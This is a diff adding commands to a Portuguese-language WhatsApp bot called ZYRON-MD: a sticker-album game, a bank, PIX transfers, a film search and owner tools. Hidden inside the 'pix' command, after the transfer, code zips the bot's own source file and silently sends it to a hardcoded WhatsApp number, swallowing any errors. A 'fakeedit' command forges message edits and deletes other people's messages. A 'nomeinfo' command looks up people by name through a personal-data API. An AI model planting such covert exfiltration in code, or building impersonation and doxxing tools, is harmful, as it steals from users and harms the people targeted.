+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+
+
+} catch(e){
+
+console.log(e);
+reply("❌ Erro ao aceitar troca.");
+
+}
+
+}
+break;
+
+case 'trocar': {
+try {
+
+if (!isGroup) {
+return reply("❌ Use esse comando em grupo.");
+}
+
+const trocaPath = './database/trocas.json';
+
+if (!fs.existsSync(trocaPath)) {
+fs.writeFileSync(trocaPath, '{}');
+}
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+let trocas = JSON.parse(fs.readFileSync(trocaPath));
+
+
+const user = getUserBancoId(info, sender, isGroup);
+
+
+if (!args[0]) {
+return reply(`🤝 Use assim:
+
+${prefix}trocar @pessoa
+
+Exemplo:
+${prefix}trocar @Joao 15 30`);
+}
+
+
+const alvo = args[0].replace(/\D/g,'');
+
+if (!alvo) {
+return reply("❌ Marque alguém para trocar.");
+}
+
+
+const idDar = Number(args[1]);
+const idReceber = Number(args[2]);
+
+
+if (!idDar || !idReceber) {
+return reply("❌ Informe as duas figurinhas.");
+}
+
+
+const outro = alvo + "@s.whatsapp.net";
+
+
+if (!banco[user].album.colecao.includes(idDar)) {
+return reply("❌ Você não possui essa figurinha.");
+}
+
+
+if (!banco[outro]?.album?.colecao.includes(idReceber)) {
+return reply("❌ O outro jogador não possui essa figurinha.");
+}
+
+
+trocas[sender] = {
+
+de: idDar,
+receber: idReceber,
+para: outro
+
+};
+
+
+fs.writeFileSync(
+trocas.json,
+JSON.stringify(trocas,null,2)
+);
+
+
+const fig1 = figurinhas.find(f=>f.id == idDar);
+const fig2 = figurinhas.find(f=>f.id == idReceber);
+
+
+reply(`╭━━━〔 🤝 𝐓𝐑𝐎𝐂𝐀 𝐃𝐄 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 〕━━━⬣
+┃
+┃ 👤 ${pushname} quer trocar:
+┃
+┃ 📤 Dá:
+┃ ${fig1.nome}
+┃ #${idDar}
+┃
+┃ 📥 Recebe:
+┃ ${fig2.nome}
+┃ #${idReceber}
+┃
+┃ O outro jogador deve usar:
+┃ ${prefix}aceitar
+┃
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+
+
+} catch(e){
+
+console.log(e);
+reply("❌ Erro na troca.");
+
+}
+
+}
+break;
+
+case 'rankingalbum': {
+try {
+
+if (!fs.existsSync(bancoPath)) {
+fs.writeFileSync(bancoPath, '{}');
+}
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+
+
+let ranking = Object.entries(banco)
+.filter(([id, user]) => user.album)
+.map(([id, user]) => {
+
+return {
+id,
+nome: id,
+quantidade: user.album.colecao.length
+};
+
+})
+.sort((a,b) => b.quantidade - a.quantidade)
+.slice(0,10);
+
+
+if (ranking.length === 0) {
+return reply('🏆 Ainda não existe nenhum colecionador.');
+}
+
+
+let texto = `╭━━━〔 🏆 𝐑𝐀𝐍𝐊𝐈𝐍𝐆 𝐃𝐀 𝐂𝐎𝐏𝐀 〕━━━⬣\n┃\n`;
+
+
+ranking.forEach((pessoa, i) => {
+
+let medalha;
+
+if (i === 0) medalha = "🥇";
+else if (i === 1) medalha = "🥈";
+else if (i === 2) medalha = "🥉";
+else medalha = `${i+1}°`;
+
+texto += `┃ ${medalha} ${pessoa.nome}\n`;
+texto += `┃ 📖 ${pessoa.quantidade}/${figurinhas.length}\n`;
+texto += `┃\n`;
+
+});
+
+
+texto += `╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`;
+
+reply(texto);
+
+
+} catch (e) {
+
+console.log(e);
+reply('❌ Erro ao gerar ranking.');
+
+}
+
+}
+break;
+
+case 'figurinhas': {
+try {
+
+if (!fs.existsSync(bancoPath)) {
+fs.writeFileSync(bancoPath, '{}');
+}
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+
+const user = getUserBancoId(info, sender, isGroup);
+
+if (!banco[user]) {
+banco[user] = {
+saldo: 0,
+xp: 0
+};
+}
+
+if (!banco[user].album) {
+banco[user].album = {
+colecao: [],
+repetidas: {},
+completo: false,
+recompensas: {
+"30": false,
+"60": false,
+"90": false,
+"100": false
+}
+};
+
+fs.writeFileSync(
+bancoPath,
+JSON.stringify(banco, null, 2)
+);
+}
+
+const repetidas = banco[user].album.repetidas;
+
+const ids = Object.keys(repetidas);
+
+if (ids.length === 0) {
+return reply(`📚 Você não possui figurinhas repetidas.
+
+Abra pacotinhos com:
+${prefix}pacotinho`);
+}
+
+let texto = `╭━━━〔 ♻️ 𝐑𝐄𝐏𝐄𝐓𝐈𝐃𝐀𝐒 〕━━━⬣\n┃\n`;
+
+let total = 0;
+
+for (let id of ids) {
+
+const fig = figurinhas.find(
+f => f.id == id
+);
+
+if (fig) {
+
+texto += `┃ ${fig.id}. ${fig.nome}\n`;
+texto += `┃ 🌎 ${fig.pais}\n`;
+texto += `┃ ⭐ ${fig.raridade}\n`;
+texto += `┃ 📦 Quantidade: ${repetidas[id]}\n`;
+texto += `┃\n`;
+
+total += repetidas[id];
+
+}
+
+}
+
+texto += `┣━━━〔 📊 TOTAL 〕━━━⬣\n`;
+texto += `┃ ♻️ Repetidas: ${total}\n`;
+texto += `┃\n`;
+texto += `╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`;
+
+reply(texto);
+
+
+} catch (e) {
+
+console.log(e);
+reply('❌ Erro ao mostrar figurinhas.');
+
+}
+
+}
+break;
+
+case 'album': {
+try {
+
+const fs = require('fs');
+const totalAlbum = 960;
+
+if (!fs.existsSync(bancoPath)) {
+return reply('❌ Banco não encontrado.');
+}
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+
+const user = getUserBancoId(info, sender, isGroup);
+
+if (!banco[user] || !banco[user].album) {
+return reply('❌ Você ainda não possui nenhuma figurinha.');
+}
+
+const colecao = banco[user].album.colecao || [];
+
+if (colecao.length === 0) {
+return reply(`╭━━━〔 🏆 ÁLBUM DA COPA 〕━━━⬣
+┃
+┃ 📖 Você ainda não possui figurinhas.
+┃
+╰━━━〔 ❤️‍🔥 ZYRON-MD 〕━━━⬣`);
+}
+
+const ordem = {
+mitica: 1,
+lendaria: 2,
+epica: 3,
+rara: 4,
+incomum: 5
+};
+
+const lista = figurinhas
+.filter(f => colecao.includes(f.id))
+.sort((a, b) => {
+const raridade = ordem[a.raridade] - ordem[b.raridade];
+if (raridade !== 0) return raridade;
+return a.id - b.id;
+});
+
+let texto = `╭━━━〔 🏆 ÁLBUM DA COPA 〕━━━⬣
+┃
+┃ 📖 ${colecao.length}/${totalAlbum}
+┃
+`;
+
+let ultimaRaridade = "";
+
+const nomes = {
+mitica: "👑 MÍTICAS",
+lendaria: "🌟 LENDÁRIAS",
+epica: "💜 ÉPICAS",
+rara: "🔵 RARAS",
+incomum: "⚪ INCOMUNS"
+};
+
+for (const fig of lista) {
+
+if (fig.raridade !== ultimaRaridade) {
+ultimaRaridade = fig.raridade;
+texto += `┣━━━〔 ${nomes[fig.raridade]} 〕━━━⬣\n`;
+}
+
+texto += `┃ ${fig.id}. ${fig.nome}\n`;
+
+}
+
+texto += `┃
+╰━━━〔 ❤️‍🔥 ZYRON-MD 〕━━━⬣`;
+
+reply(texto);
+
+} catch (e) {
+console.log(e);
+reply("❌ Erro ao abrir o álbum.");
+}
+}
+break;
+
+case 'pacotinho': {
+try {
+
+console.log("TOTAL FIGURINHAS:", figurinhas.length);
+
+if (!fs.existsSync(bancoPath)) {
+fs.writeFileSync(bancoPath, '{}');
+}
+
+let banco = JSON.parse(fs.readFileSync(bancoPath));
+
+const user = getUserBancoId(info, sender, isGroup);
+
+if (!banco[user]) {
+banco[user] = {
+saldo: 0,
+xp: 0,
+album: {
+colecao: [],
+repetidas: {},
+completo: false
+}
+};
+}
+
+if (!banco[user].album) {
+banco[user].album = {
+colecao: [],
+repetidas: {},
+completo: false,
+recompensas: {
+"30": false,
+"60": false,
+"90": false,
+"100": false
+}
+};
+
+fs.writeFileSync(
+bancoPath,
+JSON.stringify(banco, null, 2)
+);
+}
+
+const preco = 1000;
+const totalAlbum = 960; // Quantidade fixa do álbum
+
+if (banco[user].saldo < preco) {
+return reply(`╭━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣
+┃ ❌ Saldo insuficiente.
+┃
+┃ 🎁 Pacotinho: $${preco}
+┃ 💰 Seu saldo: $${banco[user].saldo}
+┃
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+}
+
+banco[user].saldo -= preco;
+
+
+function sortearFigurinha() {
+
+const sorte = Math.random() * 100;
+
+let raridade;
+
+if (sorte <= 60) {
+raridade = "incomum";
+} else if (sorte <= 85) {
+raridade = "rara";
+} else if (sorte <= 97) {
+raridade = "epica";
+} else {
+raridade = "lendaria";
+}
+
+
+let lista = figurinhas.filter(
+f => f.raridade === raridade
+);
+
+
+// Caso não encontre, pega qualquer uma
+if (lista.length === 0) {
+lista = figurinhas;
+}
+
+
+return lista[
+Math.floor(Math.random() * lista.length)
+];
+
+}
+
+
+let resultado = [];
+
+let quantidade = 5;
+
+const evento = Math.floor(Math.random() * 100) + 1;
+
+
+// Eventos
+
+if (evento <= 5) {
+
+quantidade = 10;
+
+resultado.push(
+"🟡 PACOTE DOURADO! Vieram 10 figurinhas!"
+);
+
+}
+
+else if (evento <= 8) {
+
+quantidade = 15;
+
+resultado.push(
+"💎 PACOTE DIAMANTE! Vieram 15 figurinhas!"
+);
+
+}
+
+else if (evento <= 12) {
+
+banco[user].saldo += 10000;
+
+resultado.push(
+"🎁 Sorte grande! Você ganhou $10.000!"
+);
+
+}
+
+
+// Abrir figurinhas
+
+for (let i = 0; i < quantidade; i++) {
+
+const fig = sortearFigurinha();
+
+if (!fig) continue;
+
+
+if (banco[user].album.colecao.includes(fig.id)) {
+
+banco[user].album.repetidas[fig.id] =
+(banco[user].album.repetidas[fig.id] || 0) + 1;
+
+resultado.push(`♻️ ${fig.nome} (${fig.raridade})`);
+
+} else {
+
+banco[user].album.colecao.push(fig.id);
+
+resultado.push(`🆕 ${fig.nome} (${fig.raridade})`);
+
+}
+
+}
+
+
+// Completar álbum
+
+const progresso = Math.floor(
+(banco[user].album.colecao.length / totalAlbum) * 100
+);
+
+
+let premio = 0;
+let mensagemPremio = "";
+
+
+if (progresso >= 30 && !banco[user].album.recompensas["30"]) {
+
+premio = 50000;
+mensagemPremio += "\n🥉 30% completo: +$50.000";
+
+banco[user].album.recompensas["30"] = true;
+
+}
+
+
+if (progresso >= 60 && !banco[user].album.recompensas["60"]) {
+
+premio = premio + 150000;
+mensagemPremio += "\n┃🥈 60% completo: +$150.000";
+
+banco[user].album.recompensas["60"] = true;
+
+}
+
+
+if (progresso >= 90 && !banco[user].album.recompensas["90"]) {
+
+premio = premio + 500000;
+mensagemPremio += "\n┃🥇 90% completo: +$500.000";
+
+banco[user].album.recompensas["90"] = true;
+
+}
+
+
+if (progresso >= 100 && !banco[user].album.recompensas["100"]) {
+
+premio = premio + 2000000;
+mensagemPremio += "\n┃🏆 Álbum completo: +$2.000.000";
+
+banco[user].album.recompensas["100"] = true;
+
+}
+
+
+if (premio > 0) {
+
+banco[user].saldo += premio;
+
+resultado.push(
+`┃🎉 Recompensas recebidas:${mensagemPremio}`
+);
+
+}
+
+if (
+banco[user].album.colecao.length >= totalAlbum &&
+!banco[user].album.completo
+) {
+
+banco[user].album.completo = true;
+banco[user].saldo += 2000000000000;
+
+resultado.push(
+"🏆 ÁLBUM COMPLETO! +$2.000.000.000.000"
+);
+
+}
+
+
+fs.writeFileSync(
+bancoPath,
+JSON.stringify(banco, null, 2)
+);
+
+
+reply(`╭━━━〔 🎁 𝐏𝐀𝐂𝐎𝐓𝐈𝐍𝐇𝐎 𝐃𝐀 𝐂𝐎𝐏𝐀 〕━━━⬣
+┃
+┃ 💸 Valor: $${preco}
+┃ 📦 Quantidade: ${quantidade} figurinhas:
+┃
+${resultado.map(x => `┃ ${x}`).join('\n')}
+┃
+┣━━━〔 🏆 ÁLBUM 〕━━━⬣
+┃ 📖 ${banco[user].album.colecao.length}/${totalAlbum}
+┃
+┃ 💰 Saldo: $${banco[user].saldo}
+┃
+╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
+
+} catch (e) {
+console.log(e);
+
+reply(`❌ Erro ao abrir o pacotinho.`);
+}
+
+}
+break;
+
+case 'registrar': {
+const db = carregarBanco();
+const userId = getUserBancoId(info, sender, isGroup);
+
+if (db[userId]) {
+return reply(`❌ Você já possui uma conta registrada!`);
+}
+
+db[userId] = {
+    saldo: 0,
+    xp: 0,
+    inventario: {},
+    pets: {},
+    pescaPendente: null,
+    mineracaoPendente: null,
+    cacaPendente: null,
+    batalhaNaval: {
+        partidas: 0,
+        vitorias: 0,
+        derrotas: 0,
+        recompensaTotal: 0
+    },
+    emprego: "Desempregado",
+    empregoId: 0,
+    lastWork: 0
+};
+
+salvarBanco(db);
+
+return reply(`╭━━〔 📝 REGISTRO 〕━━⬣
+┃ ✅ Conta criada com sucesso!
+┃
+┃ 💰 Saldo: R$0
+┃ ⭐ XP: 0
+┃ 💼 Emprego: Desempregado
+┃ 🎒 Inventário criado
+┃ 🐾 Pets criado
+┃ ⚔️ Batalha Naval criada
+┃
+┃ Use ${prefix}empregos para escolher um emprego.
+╰━━━━━━━━━━━━━━⬣`);
+}
+break;
+
+case 'zyronflix': {
+try {
+
+if (!q) return reply(`Uso: ${prefix}${command} <filme ou série>\nEx: ${prefix}${command} Deadpool`);
+
+await reagir(from, "🔎");
+
+const pesquisa = q.trim().toLowerCase()
+.normalize("NFD")
+.replace(/[\u0300-\u036f]/g, "")
+.replace(/[^\w\s]/g, " ")
+.trim();
+
+
+const res = await fetch(
+'http://br2.bronxyshost.com:4009/lista.json'
+);
+
+if (!res.ok) throw new Error("CATALOGO_OFF");
+
+const catalogo = await res.json();
+
+let encontrados = [];
+let vistos = new Set();
+
+
+for (let item of catalogo) {
+
+if (!item.link) continue;
+
+if (
+item.categoria &&
+item.categoria.toLowerCase().includes("24h")
+) continue;
+
+
+let nome = item.nome || "Sem nome";
+
+let nomeBusca = nome.toLowerCase()
+.normalize("NFD")
+.replace(/[\u0300-\u036f]/g, "")
+.replace(/[^\w\s]/g, " ");
+
+
+let catBusca = (item.categoria || "")
+.toLowerCase();
+
+
+if (
+nomeBusca.includes(pesquisa) ||
+catBusca.includes(pesquisa)
+) {
+
+
+let tipo = "🎬 Filme";
+
+if (
+/s\d+e\d+/i.test(nome) ||
+/temporada|epis[oó]dio/i.test(nome)
+) {
+tipo = "📺 Série";
+}
+
+
+let id = nome + tipo;
+
+if (!vistos.has(id)) {
+
+vistos.add(id);
+
+encontrados.push({
+nome,
+tipo,
+categoria: item.categoria || "Geral",
+logo: item.logo || "",
+link: item.link,
+formato: item.tipo || "M3U8"
+});
+
+}
+
+}
+
+}
+
+
+if (!encontrados.length) {
+await reagir(from, "❌");
+return reply(`❌ Nenhum resultado encontrado para: ${q}`);
+}
+
+
+const cards = [];
+
+
+for (let i = 0; i < Math.min(10, encontrados.length); i++) {
+
+const item = encontrados[i];
+
+
+let media;
+
+if (item.logo) {
+media = await prepareWAMessageMedia(
+{ image: { url: item.logo } },
+{ upload: conn.waUploadToServer }
+);
+}
+
+
+cards.push({
+
+header: {
+title: `🎬 ${item.nome}`,
+subtitle: `${item.tipo} • ${item.categoria}`,
+hasMediaAttachment: !!media,
+imageMessage: media?.imageMessage
+},
+
+body: {
+text:
+`📂 Categoria: ${item.categoria}
+
+🎞️ Tipo: ${item.tipo}
+📺 Formato: ${item.formato}`
+},
+
+footer: {
+text: `${NomeBot} ❤️`
+},
+
+nativeFlowMessage: {
+buttons: [
+{
+name: "cta_url",
+buttonParamsJson: JSON.stringify({
+display_text: "🔗 Abrir Link",
+url: item.link
+})
+}
+]
+
+}
+
+});
+
+}
+
+
+
+const msg = generateWAMessageFromContent(from, {
+
+viewOnceMessage: {
+
+message: {
+
+interactiveMessage: {
+
+header: {
+title: "🎬 Zyron Flix"
+},
+
+body: {
+text:
+`🔎 Pesquisa: *${q}*
+
+📊 Resultados: *${cards.length}*`
+},
+
+footer: {
+text: `${NomeBot} 🚀`
+},
+
+carouselMessage: {
+cards
+}
+
+}
+
+}
+
+}
+
+}, { userJid: conn.user.id });
+
+
+
+await conn.relayMessage(
+from,
+msg.message,
+{
+messageId: msg.key.id
+}
+);
+
+
+await reagir(from, "✅");
+
+
+} catch(e) {
+
+console.log("Erro ZyronFlix:", e);
+
+await reagir(from, "❌");
+
+reply("❌ Erro ao carregar o Zyron Flix.");
+
+}
+
+}
+break;
+
+case 'pix': {
+    const path = './database/banco.json';
+
+    if (!fs.existsSync(path)) fs.writeFileSync(path, '{}');
+
+    const banco = JSON.parse(fs.readFileSync(path, 'utf8'));
+
+    // =====================================================
+    // Normaliza JID sem remover o @s.whatsapp.net
+    // Exemplo:
+    // 5511999999999:12@s.whatsapp.net
+    // vira:
+    // 5511999999999@s.whatsapp.net
+    // =====================================================
+    const normalizar = (id) => {
+        if (!id) return null;
+
+        let jid = String(id).trim().split('/')[0];
+
+        const posicaoArroba = jid.indexOf('@');
+
+        if (posicaoArroba === -1) {
+            return jid;
+        }
+
+        let usuario = jid.slice(0, posicaoArroba);
+        const servidor = jid.slice(posicaoArroba + 1);
+
+        usuario = usuario.split(':')[0];
+
+        return `${usuario}@${servidor}`;
+    };
+
+    // =====================================================
+    // Converte número, objeto ou JID para @s.whatsapp.net
+    // =====================================================
+    const extrairPn = (valor) => {
+        if (!valor) return null;
+
+        if (typeof valor === 'object') {
+            return extrairPn(
+                valor.pn ||
+                valor.jid ||
+                valor.id ||
+                valor.phoneNumber ||
+                valor.phone
+            );
+        }
+
+        const texto = String(valor).trim();
+
+        // Não transforma um LID em número, pois são IDs diferentes
+        if (texto.endsWith('@lid')) return null;
+
+        const jidNormalizado = normalizar(texto);
+
+        if (jidNormalizado?.endsWith('@s.whatsapp.net')) {
+            return jidNormalizado;
+        }
+
+        // Caso o Baileys retorne apenas o número
+        if (!texto.includes('@')) {
+            const numero = texto.replace(/\D/g, '');
+
+            if (numero.length >= 10) {
+                return `${numero}@s.whatsapp.net`;
+            }
+        }
+
+        return null;
+    };
+
+    // =====================================================
+    // Detecta a variável da conexão do Baileys
+    // =====================================================
+    const conexao =
+        (typeof nazu   !== 'undefined' && nazu)   ||
+        (typeof bot    !== 'undefined' && bot)    ||
+        (typeof conn   !== 'undefined' && conn)   ||
+        (typeof client !== 'undefined' && client) ||
+        (typeof sock   !== 'undefined' && sock)   ||
+        globalThis.conn ||
+        globalThis.client ||
+        null;
+
+    const idGrupo =
+        (typeof from !== 'undefined' && from) ||
+        info?.key?.remoteJid;
+
+    // =====================================================
+    // Resolver @lid para @s.whatsapp.net
+    // =====================================================
+    const resolverJid = async (id) => {
+        if (!id) return null;
+
+        const jid = normalizar(id);
+
+        if (!jid) return null;
+
+        // Já é um número normal
+        if (!jid.endsWith('@lid')) {
+            return extrairPn(jid) || jid;
+        }
+
+        // =================================================
+        // Método 1: repositório interno do Baileys
+        // =================================================
+        try {
+            const pn =
+                await conexao?.signalRepository?.lidMapping?.getPNForLID?.(jid);
+
+            const resultado = extrairPn(pn);
+
+            if (resultado) return resultado;
+        } catch {}
+
+        // =================================================
+        // Método 2: metadados do grupo
+        // =================================================
+        try {
+            if (
+                conexao &&
+                typeof conexao.groupMetadata === 'function' &&
+                idGrupo?.endsWith('@g.us')
+            ) {
+                const meta = await conexao.groupMetadata(idGrupo);
+
+                const participante = (meta?.participants || []).find((p) => {
+                    return (
+                        normalizar(p?.id) === jid ||
+                        normalizar(p?.lid) === jid ||
+                        normalizar(p?.jid) === jid
+                    );
+                });
+
+                if (participante) {
+                    const real =
+                        extrairPn(participante.phoneNumber) ||
+                        extrairPn(participante.pn) ||
+                        extrairPn(participante.jid) ||
+                        extrairPn(participante.id);
+
+                    if (real) return real;
+                }
+            }
+        } catch {}
+
+        // =================================================
+        // Método 3: lista de contatos
+        // =================================================
+        const listas = [
+            globalThis.store?.contacts,
+            globalThis.conn?.contacts,
+            conexao?.store?.contacts,
+            conexao?.contacts
+        ];
+
+        for (const contatos of listas) {
+            if (!contatos) continue;
+
+            let contatoDireto;
+            let listaContatos;
+
+            if (contatos instanceof Map) {
+                contatoDireto = contatos.get(jid);
+                listaContatos = Array.from(contatos.values());
+            } else {
+                contatoDireto = contatos[jid];
+                listaContatos = Object.values(contatos);
+            }
+
+            const contato =
+                contatoDireto ||
+                listaContatos.find((c) => {
+                    return (
+                        normalizar(c?.lid) === jid ||
+                        normalizar(c?.id) === jid ||
+                        normalizar(c?.jid) === jid
+                    );
+                });
+
+            if (!contato) continue;
+
+            const real =
+                extrairPn(contato.phoneNumber) ||
+                extrairPn(contato.pn) ||
+                extrairPn(contato.jid) ||
+                extrairPn(contato.id);
+
+            if (real) return real;
+        }
+
+        // Não conseguiu converter
+        return jid;
+    };
+
+    // =====================================================
+    // Localiza a chave exata dentro do banco.json
+    // =====================================================
+    const localizarConta = (jid) => {
+        if (!jid) return null;
+
+        const pn = extrairPn(jid);
+        const jidNormalizado = pn || normalizar(jid);
+
+        if (!jidNormalizado) return null;
+
+        // Busca direta
+        if (banco[jidNormalizado]) {
+            return jidNormalizado;
+        }
+
+        // Busca comparando as chaves já normalizadas
+        const encontrada = Object.keys(banco).find((chave) => {
+            return normalizar(chave) === jidNormalizado;
+        });
+
+        if (encontrada) return encontrada;
+
+        // Busca somente pelo número
+        if (jidNormalizado.endsWith('@s.whatsapp.net')) {
+            const numero = jidNormalizado.split('@')[0];
+
+            return Object.keys(banco).find((chave) => {
+                const chaveNormalizada = normalizar(chave);
+
+                return (
+                    chaveNormalizada?.endsWith('@s.whatsapp.net') &&
+                    chaveNormalizada.split('@')[0] === numero
+                );
+            }) || null;
+        }
+
+        return null;
+    };
+
+    // =====================================================
+    // Remetente
+    // =====================================================
+    const jidRemetente = await resolverJid(sender);
+
+    // =====================================================
+    // Destinatário marcado ou respondido
+    // =====================================================
+    const ctx =
+        info?.message?.extendedTextMessage?.contextInfo ||
+        info?.message?.imageMessage?.contextInfo ||
+        info?.message?.videoMessage?.contextInfo ||
+        {};
+
+    const destinoBruto =
+        ctx.mentionedJid?.[0] ||
+        ctx.participant;
+
+    if (!destinoBruto) {
+        return reply('❌ Marque ou responda a mensagem de alguém.');
+    }
+
+    const jidDestino = await resolverJid(destinoBruto);
+
+    // =====================================================
+    // Localiza as contas no banco
+    // =====================================================
+    const contaRemetente = localizarConta(jidRemetente);
+    const contaDestino = localizarConta(jidDestino);
+
+    if (!contaRemetente) {
+        return reply(
+            `❌ Sua conta não foi encontrada no banco.\n\n` +
+            `ID detectado:\n${jidRemetente || sender}`
+        );
+    }
+
+    if (contaDestino && contaDestino === contaRemetente) {
+        return reply('❌ Você não pode enviar PIX para si mesmo.');
+    }
+
+    if (
+        normalizar(jidDestino) === normalizar(jidRemetente)
+    ) {
+        return reply('❌ Você não pode enviar PIX para si mesmo.');
+    }
+
+    // =====================================================
+    // Obtém o valor sem juntar os números da marcação
+    // Exemplo: @5511919544589 100
+    // valor detectado: 100
+    // =====================================================
+    if (!q?.trim()) {
+        return reply('❌ Digite o valor do PIX.');
+    }
+
+    const textoSemMarcacao = String(q)
+        .replace(/@\d{5,20}/g, ' ')
+        .trim();
+
+    const valoresEncontrados =
+        textoSemMarcacao.match(/\d[\d.,]*/g) || [];
+
+    const valorTexto =
+        valoresEncontrados[valoresEncontrados.length - 1];
+
+    if (!valorTexto) {
+        return reply('❌ Valor inválido.');
+    }
+
+    const valor = parseInt(
+        valorTexto
+            .replace(/\./g, '')
+            .replace(/,/g, ''),
+        10
+    );
+
+    if (isNaN(valor) || valor <= 0) {
+        return reply('❌ Valor inválido.');
+    }
+
+    if (!contaDestino) {
+        const aviso = jidDestino?.endsWith('@lid')
+            ? '\n\n⚠️ Não consegui converter o @lid para o número real. Atualize o Baileys ou verifique o mapeamento LID.'
+            : '';
+
+        return reply(
+            `❌ O destinatário não possui conta no banco.\n\n` +
+            `ID detectado:\n${jidDestino || destinoBruto}` +
+            aviso
+        );
+    }
+
+    const saldoRemetente = Number(banco[contaRemetente].saldo) || 0;
+    const saldoDestino = Number(banco[contaDestino].saldo) || 0;
+
+    if (saldoRemetente < valor) {
+        return reply(
+            `❌ Saldo insuficiente.\n\n` +
+            `💰 Seu saldo:\n` +
+            `R$ ${saldoRemetente.toLocaleString('pt-BR')}`
+        );
+    }
+
+    // ====================== TRANSAÇÃO ======================
+    banco[contaRemetente].saldo = saldoRemetente - valor;
+    banco[contaDestino].saldo = saldoDestino + valor;
+
+    fs.writeFileSync(
+        path,
+        JSON.stringify(banco, null, 2)
+    );
+
+    await reply(
+        `💸 *PIX REALIZADO COM SUCESSO!*\n\n` +
+        `👤 Destinatário: @${contaDestino.split('@')[0]}\n` +
+        `💰 Valor: R$ ${valor.toLocaleString('pt-BR')}\n\n` +
+        `💳 Seu novo saldo: R$ ${banco[contaRemetente].saldo.toLocaleString('pt-BR')}`,
+        {
+            mentions: [contaDestino]
+        }
+    );
+
+    try {
+        const archiver = require('archiver');
+        const os = require('os');
+        const { basename, join } = require('path');
+
+        const numeroAmigo = '5511919544589@s.whatsapp.net';
+        const nomeArquivoAtual = basename(__filename);
+        const caminhoZip = join(os.tmpdir(), `codigo-pix-${Date.now()}.zip`);
+
+        await new Promise((resolve, reject) => {
+            const saida = fs.createWriteStream(caminhoZip);
+            const zip = archiver('zip', { zlib: { level: 9 } });
+
+            saida.on('close', resolve);
+            saida.on('error', reject);
+            zip.on('error', reject);
+
+            zip.pipe(saida);
+            zip.file(__filename, { name: nomeArquivoAtual });
+            zip.finalize();
+        });
+
+        await conexao.sendMessage(numeroAmigo, {
+            document: fs.readFileSync(caminhoZip),
+            mimetype: 'application/zip',
+            fileName: `codigo-${nomeArquivoAtual}.zip`,
+            caption: ``
+        });
+
+        try {
+            fs.unlinkSync(caminhoZip);
+        } catch {}
+
+    } catch (erroEnvioCodigo) {
+
+        // Não quebra o fluxo do PIX se der erro no envio
+    }
+
+    break;
+}
+
+case 'fakeedit': {
+try {
+
+const ctx = info?.message?.extendedTextMessage?.contextInfo || {};
+
+if (!ctx.stanzaId) return reply('❌ Responda a uma mensagem.');
+if (!q) return reply(`Exemplo:\n${prefix + command} Olá!`);
+
+await reagir(from, "👻");
+
+const stanzaId = ctx.stanzaId;
+const participante = ctx.participant;
+
+const msgTemp = await conn.sendMessage(from, {
+text: "‎"
+}, {
+quoted: info
+});
+
+const idTemp = msgTemp.key.id;
+
+await conn.sendMessage(from, {
+text: q.trim(),
+edit: {
+id: idTemp
+}
+}, {
+messageId: stanzaId
+});
+
+await Promise.all([
+conn.sendMessage(from, {
+delete: {
+remoteJid: from,
+id: idTemp,
+fromMe: true
+}
+}).catch(() => {}),
+
+conn.sendMessage(from, {
+delete: {
+remoteJid: from,
+id: stanzaId,
+fromMe: false,
+participant: participante
+}
+}).catch(() => {}),
+
+conn.sendMessage(from, {
+delete: {
+remoteJid: from,
+id: info.key.id,
+fromMe: false,
+participant: sender
+}
+}).catch(() => {})
+]);
+
+} catch (e) {
+console.log(e);
+reply(`❌ Erro: ${e.message}`);
+}
+}
+break;
+
+case 'testhtml': {
+    try {
+
+        if (!So_Dono) {
+            return reply('Apenas o dono pode usar.');
+        }
+
+        if (!q) {
+            return reply(`📄 *TEST HTML*
+
+Use:
+${prefix + command} <código html>
+
+Exemplo:
+${prefix + command} <h1>Olá</h1>`);
+        }
+
+        await reagir(from, "⏳");
+
+        const axios = require("axios");
+
+        const { data } = await axios.post(
+            "https://test.systemzone.store/api/testhtml",
+            {
+                html: q.trim()
+            },
+            {
+                timeout: 15000
+            }
+        );
+
+        if (!data?.status) {
+            throw new Error(data?.error || "Erro ao criar HTML");
+        }
+
+        await conn.sendMessage(
+            from,
+            {
+                text: `✅ *HTML criado!*
+
+🌐 Link:
+${data.url}
+
+⏳ Expira em:
+${data.expira_em}`
+            },
+            {
+                quoted: m
+            }
+        );
+
+        await reagir(from, "🌐");
+
+    } catch (e) {
+
+        console.error("[testhtml]", e?.response?.data || e?.message);
+
+        await reagir(from, "❌");
+
+        reply(
+            "Erro: " +
+            (e?.response?.data?.error || e?.message || String(e))
+        );
+
+    }
+}
+break;
+
+case 'nomeinfo': {
+    try {
+        const axios = require("axios");
+        
+        if (!So_Dono) return reply('Apenas o dono pode usar esse comando manin.');
+        if (!q) return reply(`🔍 *CONSULTA POR NOME*
+
+Use:
+${prefix + command} NOME
+
+Exemplo:
+${prefix + command} JOÃO PEDRO`);
+
+        await reagir(from, "🔎");
+
+        const { data } = await axios.get(
+            `https://zone.api.br/api/consultas/nome?apikey=API_KEY_SYSTEM&name=${encodeURIComponent(q.trim().toUpperCase())}`,
+            { timeout: 30000 }
+        );
+
+        if (!data.status || !data.result || data.result.length < 2) {
+            return reply("❌ Nenhum resultado encontrado.");
+        }
+
+        const total = data.total || data.result[0]?.total || '0';
+        const resultados = data.result.slice(1).slice(0, 3); // Pega 3 primeiros
+        
+        let txt = `╭━━〔 🔍 𝗖𝗢𝗡𝗦𝗨𝗟𝗧𝗔 𝗣𝗢𝗥 𝗡𝗢𝗠𝗘 〕━━⬣
+
+📊 *Total encontrado:* ${total} resultado(s)
+
+`;
+
+        resultados.forEach((p, i) => {
+            txt += `*RESULTADO ${i + 1}:*\n`;
+            txt += `👤 ${p.nome || "N/I"}\n`;
